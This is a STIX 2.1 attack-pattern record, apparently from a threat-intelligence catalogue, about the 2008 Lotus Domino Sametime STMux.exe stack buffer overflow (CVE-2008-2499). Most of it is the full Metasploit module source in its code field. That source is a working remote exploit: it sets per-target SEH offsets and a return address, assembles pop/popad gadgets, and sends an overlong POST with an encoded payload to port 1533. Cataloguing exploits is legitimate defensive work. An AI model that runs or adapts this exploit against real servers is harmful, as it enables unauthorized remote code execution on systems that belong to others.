{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--f67de1e5-90e0-478a-9e4c-450adbd83657",
    "created": "2024-08-14T16:47:50.450235Z",
    "modified": "2024-08-14T16:47:50.450238Z",
    "name": "IBM Lotus Domino Sametime STMux.exe Stack Buffer Overflow",
    "description": " This module exploits a stack buffer overflow in Lotus Domino\\'s Sametime Server. By sending an overly long POST request to the Multiplexer STMux.exe service we are able to overwrite SEH. Based on the exploit by Manuel Santamarina Suarez. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/windows/lotus/domino_sametime_stmux.rb",
            "external_id": "domino_sametime_stmux.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2008-2499"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = AverageRanking\n\n  include Msf::Exploit::Remote::Tcp\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'\t\t=> 'IBM Lotus Domino Sametime STMux.exe Stack Buffer Overflow',\n      'Description'\t=> %q{\n          This module exploits a stack buffer overflow in Lotus Domino\\'s Sametime\n        Server. By sending an overly long POST request to the Multiplexer\n        STMux.exe service we are able to overwrite SEH. Based on the exploit\n        by Manuel Santamarina Suarez.\n      },\n      'Author'\t\t   => [ 'aushack', 'riaf <riaf[at]mysec.org>' ],\n      'Arch'\t\t\t=> [ ARCH_X86 ],\n      'License'\t\t=> MSF_LICENSE,\n      'References'\t=>\n        [\n          [ 'CVE', '2008-2499' ],\n          [ 'OSVDB', '45610' ],\n          [ 'BID', '29328' ],\n          [ 'ZDI', '08-028' ],\n        ],\n      'Privileged'\t\t=> true,\n      'DefaultOptions'\t=>\n        {\n          'EXITFUNC' => 'seh',\n        },\n      'Payload'\t\t=>\n        {\n          'Space'\t\t\t=> 1024,\n          'BadChars'\t\t=> \"\\x00\\x0a\\x0d\",\n          'StackAdjustment'\t=> -3500,\n        },\n      'Platform' => ['win'],\n      'Targets'  =>\n        [\n          # Patrick - Tested OK against Windows 2003 SP1 20081114\n          [ 'Lotus Sametime 7.5 on Windows Server 2000 SP4', { 'Ret' => 0x7c3410c2, 'Offset' => [ 3, 268 ] }], # pop ecx, pop exc, ret msvcr71.dll\n          [ 'Lotus Sametime 7.5 on Windows Server 2003 SP1', { 'Ret' => 0x7c3410c2, 'Offset' => [ 3, 269 ] }], # pop ecx, pop exc, ret msvcr71.dll\n          [ 'Lotus Sametime 7.5 on Windows Server 2003 SP2', { 'Ret' => 0x7c3410c2, 'Offset' => [ 4, 269 ] }],\n          [ 'Lotus Sametime 7.5.1  Windows Server 2003 SP2', { 'Ret' => 0x7c3410c2, 'Offset' => [ 5, 269 ] }],\n          [ 'Lotus Sametime 8.0.0  Windows Server 2003 SP2', { 'Ret' => 0x7c3410c2, 'Offset' => [ 4, 269 ] }],\n        ],\n      'DisclosureDate' => '2008-05-21',\n      'DefaultTarget' => 1))\n\n    register_options(\n      [\n        Opt::RPORT(1533),\n      ])\n  end\n\n  def check\n    connect\n\n    req = \"HEAD / HTTP/1.1\\r\\n\"\n    req << \"Host: #{datastore['RHOST']}:#{datastore['RPORT']}\\r\\n\"\n    req << \"User-Agent: Sametime Community Agent\\r\\n\\r\\n\"\n\n    sock.put(req)\n    res = sock.get_once || ''\n\n    disconnect\n\n    if (res.to_s =~/Lotus-Domino/)\n      connect\n\n      req = \"GET /CommunityCBR HTTP/1.1\\r\\n\"\n      req << \"Host: #{datastore['RHOST']}:#{datastore['RPORT']}\\r\\n\"\n      req << \"User-Agent: Sametime Community Agent\\r\\n\\r\\n\"\n      sock.put(req)\n      res = sock.get_once || ''\n\n      disconnect\n\n      if (res.to_s =~ /200 OK/)\n        return Exploit::CheckCode::Detected\n      end\n    end\n\n    return Exploit::CheckCode::Safe\n  end\n\n  def exploit\n    connect\n\n    pad1 = rand_text_alpha_lower(44)\n    pad2 = rand_text_alpha_lower(29)\n\n    # Patrick - We should use Metasm here.\n    popebx = Metasm::Shellcode.assemble(Metasm::Ia32.new, \"pop ebx\").encode_string * target['Offset'][0]\n    popad\t = Metasm::Shellcode.assemble(Metasm::Ia32.new, \"popad\").encode_string * target['Offset'][1]\n    esp  = \"\\xff\\x24\\x24\" # dword ptr ss:[esp]\n    jmp  = \"\\x74\\x23\" + \"\\x75\\x21\" # je short, jnz short\n    seh = [target['Ret']].pack('V')\n\n    path = pad1 + jmp + seh + pad2 + popebx + popad + esp\n\n    req = \"POST /CommunityCBR/CC.39.#{path}/\\r\\n\"\n    req << \"Host: #{datastore['RHOST']}:#{datastore['RPORT']}\\r\\n\"\n    req << \"User-Agent: Sametime Community Agent\\r\\n\"\n    req << \"Content-Length: #{payload.encoded.length}\\r\\n\"\n    req << \"Connection: Close\\r\\n\"\n    req << \"Cache-Control: no-cache\\r\\n\\r\\n\"\n    req << payload.encoded\n\n    sock.put(req)\n\n    handler\n    disconnect\n  end\nend\n",
    "x_mitre_disclosure_date": "2008-05-21",
    "x_mitre_platforms": [
        "['win']"
    ]
}